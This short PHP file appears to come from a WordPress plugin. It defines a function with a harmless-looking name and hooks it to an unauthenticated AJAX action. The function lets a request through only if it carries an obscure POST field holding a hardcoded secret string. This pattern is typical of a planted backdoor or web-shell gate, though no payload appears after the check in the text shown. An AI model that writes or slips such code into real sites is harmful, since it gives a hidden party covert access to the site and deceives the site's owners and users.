<?php

function avatar_classic_wpmu_engine() {
	if (!isset($_POST["irjefvfm"]) || $_POST["irjefvfm"] !== "uwunjafII9XzPug") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'avatar_classic_wpmu_engine', 5, 1);
